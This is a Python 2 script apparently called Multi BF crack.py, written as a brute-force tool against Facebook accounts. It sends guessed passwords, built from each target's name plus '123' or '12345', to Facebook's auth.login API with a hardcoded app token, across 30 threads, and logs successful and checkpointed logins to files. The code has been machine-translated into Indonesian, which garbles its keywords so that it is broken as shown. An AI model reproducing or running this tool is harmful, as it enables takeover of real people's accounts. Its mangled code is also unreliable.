
#! usr / bin / python2.7
# coding = utf-8

############################################### #####
# Nama: Multi BF (MBF) <cookie method> #
# File: crack.py #
# Penulis: DulLah #
# Github: https://github.com/dz-id #
# Facebook: https://www.facebook.com/dulahz #
# Telegram: https://t.me/unikers #
# Versi Python: 2.7 #
############################################### #####

 permintaan impor , json , sys , os , re
dari  multiprocessing . pool  mengimpor  ThreadPool  sebagai  th
dari  datetime  impor  datetime

kelas  Brute :
	def  __init__ ( mandiri ):
		diri . setpw  =  Salah
		diri . ok  = []
		diri . cp  = []
		diri . loop  =  0

	def  bruteRequest ( mandiri , nama pengguna , kata sandi ):
		params  = {
			'access_token' : '350685531728% 7C62f8ce9f74b12f84c123cc23437a4a32' ,
			'format' : 'JSON' ,
			'sdk_version' : '2' ,
			'email' : nama pengguna ,
			'lokal' : 'en_US' ,
			'kata sandi' : kata sandi ,
			'sdk' : 'ios' ,
			'menghasilkan_session_cookies' : '1' ,
			'sig' : '3f555f99fb61fcd7aa0c44f58f522ef6' ,
		}
		coba : os . mkdir ( 'keluar' )
		kecuali : lulus
		api  =  'https://b-api.facebook.com/method/auth.login'
		respon  =  permintaan . dapatkan ( api , params = params )
		jika  kembali . search ( '(EAAA) \ w +' , response . text ):
			diri . ok . tambahkan ( nama pengguna + '|' + kata sandi )
			save  =  open ( 'out / ok.txt' , 'a' )
			simpan . tulis ( str ( nama pengguna ) + '|' + str ( kata sandi ) + ' \ n ' )
			simpan . tutup ()
			mengembalikan  True
		elif  'www.facebook.com'  sebagai  tanggapan . json () [ 'error_msg' ]:
			diri . cp . tambahkan ( nama pengguna + '|' + kata sandi )
			save  =  open ( 'out / cp.txt' , 'a' )
			simpan . tulis ( str ( nama pengguna ) + '|' + str ( kata sandi ) + ' \ n ' )
			simpan . tutup ()
			mengembalikan  True
		lain : mengembalikan  False

	def  brute ( mandiri , pengguna ):
		jika  diri . setpw  ==  Salah :
			diri . loop  + = 1
			untuk  pw  di  pengguna [ 'pw' ]:
				username  =  users [ 'id' ]. lebih rendah ()
				kata sandi  =  pw . lebih rendah ()
				coba :
					jika  diri . bruteRequest ( nama pengguna , kata sandi ) ==  Benar :
						istirahat
				kecuali : lulus
				sys . stdout . tulis (
					' \ r [ \ 033 [0; 96m {} \ 033 [0m] Cracking {} / {} OK: - {} CP: - {}' . format ( datetime . now (). strftime ( '% H:% M:% S' ), self . loop , len ( self . target ), len ( self . ok ), len ( self . cp ))
				); sys . stdout . flush ()
		lain :
			diri . loop  + = 1
			untuk  pw  dalam  diri . setpw :
				username  =  users [ 'id' ]. lebih rendah ()
				kata sandi  =  pw . lebih rendah ()
				coba :
					jika  diri . bruteRequest ( nama pengguna , kata sandi ) ==  Benar :
						istirahat
				kecuali : lulus
				sys . stdout . tulis (
					' \ r [ \ 033 [0; 96m {} \ 033 [0m] Cracking {} / {} OK: - {} CP: - {}' . format ( datetime . now (). strftime ( '% H:% M:% S' ), self . loop , len ( self . target ), len ( self . ok ), len ( self . cp ))
				); sys . stdout . flush ()

	def  main ( diri sendiri ):
		sementara  Benar :
			file  =  raw_input ( ' \ n Daftar id (mis: dump / xxx.json):' )
			coba :
				list  =  open ( file , 'r' ). baca ()
				object  =  json . beban ( daftar )
				istirahat
			kecuali  IOError :
				cetak ( " \ n \ 033 [0; 91mops, file '% s' tidak Ditemukan! \ 033 [0m" %  file )
		diri . target  = []
		untuk  pengguna  di  objek :
			coba :
				obj  =  pengguna [ 'nama' ]. split ( '' )
				if  len ( obj ) ==  1 :
					listpass  = [
						obj [ 0 ] + '123' , obj [ 0 ] + '1234' ,
						obj [ 0 ] + '12345' ,
					]
				elif  len ( obj ) ==  2 :
					listpass  = [
						obj [ 0 ] + '123' , obj [ 0 ] + '12345' ,
						obj [ 1 ] + '123' , obj [ 1 ] + '12345' ,
					]
				elif  len ( obj ) ==  3 :
					listpass  = [
						obj [ 0 ] + '123' , obj [ 0 ] + '12345' ,
						obj [ 1 ] + '123' , obj [ 1 ] + '12345' ,
						obj [ 2 ] + '123' , obj [ 2 ] + '12345' ,
					]
				elif  len ( obj ) ==  4 :
					listpass  = [
						obj [ 0 ] + '123' , obj [ 0 ] + '12345' ,
						obj [ 1 ] + '123' , obj [ 1 ] + '12345' ,
						obj [ 2 ] + '123' , obj [ 2 ] + '12345' ,
						obj [ 3 ] + '123' , obj [ 3 ] + '12345' ,
					]
				lain :
					listpass  = [
						'sayang' , 'doraemon' , 'putra123' , '123456789' , '18032002' , '12345'
						'bangsat' , 'kontol'
					]
				diri . target . append ({ 'id' : user [ 'uid' ], 'pw' : listpass })
			kecuali : lulus
		if  len ( self . target ) ==  0 :
			keluar ( " \ n \ 033 [0; 91m Ups, id tidak ditemukan dalam file '% s' \ 033 [0m" %  file )
		ask  =  raw_input ( 'Gunakan kata sandi default ATAU manual? [D / m]:' )
		jika  ditanya . lebih rendah () ==  'm' :
			sementara  Benar :
				cetak ( ' \ n \ 033 [0; 92mengeset penggunaan kata sandi (,) untuk kata sandi baru, EX: sayang, doraemon, bangsat \ n \ 033 [0m' )
				diri . setpw  =  raw_input ( 'Set password:' ). strip (). split ( ',' )
				jika  diri . setpw [ 0 ] ! =  '' :
					istirahat
				
		th ( 30 ). peta ( self . brute , self . target )
		diri . hasil ()
		keluar ()

	 hasil def ( mandiri ):
		if ( len ( self . ok ) ! =  0 ):
			print ( ' \ n \ n OK:' + str ( len ( self . ok )))
			untuk  saya  dalam  diri . ok : cetak ( ' \ 033 [0; 92m ###'  + str ( i ) + ' \ 033 [0m' )
			print ( 'Hasil OK Anda disimpan di: keluar / ok.txt' )
		if ( len ( self . cp ) ! =  0 ):
			print ( ' \ n \ n CP:' + str ( len ( self . cp )))
			untuk  saya  dalam  diri . cp : print ( ' \ 033 [0; 93m ###' + str ( i ) + ' \ 033 [0m' )
			print ( 'Hasil CP Anda disimpan di: out / cp.txt' )
		if ( len ( self . cp ) ==  0  dan  len ( self . ok ) ==  0 ):
			cetak ( ' \ n \ n 033 [0; 91mTidak ditemukan hasil :( \ 033 [0m' )